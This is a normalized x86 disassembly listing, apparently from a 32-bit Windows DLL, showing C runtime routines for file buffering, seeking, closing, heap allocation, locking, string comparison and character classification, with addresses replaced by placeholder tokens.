mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_100224cb
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_10029a45
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_10022bd6
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_1002ae89
pop ecx
push eax
call sub_1002b5ee
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_10026940
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_1002262d
push 0xc
push r--data
call sub_10028b48
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100224cb
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100226a5
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
call sub_10028b8d
retn
sub_100226af
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_1002ae89
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_10026065
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1002b6ca
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_100227a0
push 0xc
push r--data
call sub_10028b48
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100226af
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022808
mov eax [ ebp - 0x1c ]
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10028b8d
retn
sub_10022812
push 0xc
push r--data
call sub_10028b48
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_1002ae89
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_10028b8d
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002290e
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_1002b713
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_10026065
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10022916
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_10022bd6
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1002b98f
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002ae89
pop ecx
push eax
call sub_1002b8b3
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_100229a0
push 0xc
push r--data
call sub_10028b48
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022916
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022a1b
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_10028b8d
retn
cmp edi 0x2
jne r-xdata
sub_10022a25
mov edi edi
push ebp
mov ebp esp
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002be78
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop ebp
retn
pop esi
xor eax eax
sub_10022a93
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
je r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_1002bf5e
add esp 0x10
pop esi
pop ebp
retn
sub_10022ad8
push 0xc
push r--data
call sub_10028b48
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x4
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10028b8d
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp eax 0x40
jne r-xdata
cmp eax 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] ebx
push esi
call sub_10022bd6
push esi
call sub_1002bfad
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test [ ebp + 0x10 ] 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_10026ca5
pop ecx
cmp eax ebx
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022bcc
mov eax [ ebp - 0x1c ]
sub_10022bd6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1002ae89
pop ecx
push eax
call sub_1002b5ee
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10022c3e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10022bd6
pop ecx
test eax eax
je r-xdata
push esi
call sub_10022c86
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1002ae89
push eax
call sub_1002bfde
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10022c86
push 0x14
push r--data
call sub_10028b48
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022d57
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10028b8d
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10023117
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10022d28
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10022c3e
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10022c3e
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10022d60
push 0xc
push r--data
call sub_10028b48
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_10022c3e
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022da9
mov eax [ ebp - 0x1c ]
push esi
call sub_10022c86
pop ecx
jmp r-xdata
call sub_10028b8d
retn
sub_10022dbc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_10022bd6
push esi
mov ebx eax
call sub_1002bfad
push esi
call sub_1002ae89
push eax
call sub_1002c15b
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_100207fd
pop ecx
mov [ esi + 0x1c ] edi
sub_10022e33
push 0xc
push r--data
call sub_10028b48
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_10022dbc
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022ea7
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_10028b8d
retn
mov eax [ ebp - 0x1c ]
sub_10022ee3
push 0xc
push r--data
call sub_10028b48
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
push 0x4
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10029760
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022f29
sub_10022f32
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_10027744
pop ecx
call sub_10026065
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_1002ac8b
push 0x1e
call sub_1002aae0
push 0xff
call sub_1002375c
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_10022ee3
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_10026065
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_10027744
pop ecx
test eax eax
je r-xdata
call sub_10026065
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_10023005
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10026cea
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10026cea
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_100230d6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10028f4e
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10023117
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10028f4e
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10023149
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10028e74
pop ecx
pop ebp
retn
sub_10023185
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10028e74
pop ecx
pop ebp
retn
sub_100231b4
push 0xc
push r--data
call sub_10028b48
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_10028b8d
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_1002ae89
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100232c6
mov eax [ ebp - 0x1c ]
push ebx
call sub_1002cc12
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_10029c4f
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_1002ccae
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_10026065
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10020579
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_100232d0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10023358
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10027e84
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_10025192
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1002cf08
mov [ esi + 0x4 ] eax
sub_100233df
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1002d3c5
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10023430
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100233df
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_1002345e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_1002d3c5
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100234af
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002345e
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_100234dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1002d3c5
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002352e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100234dd
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1002355c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
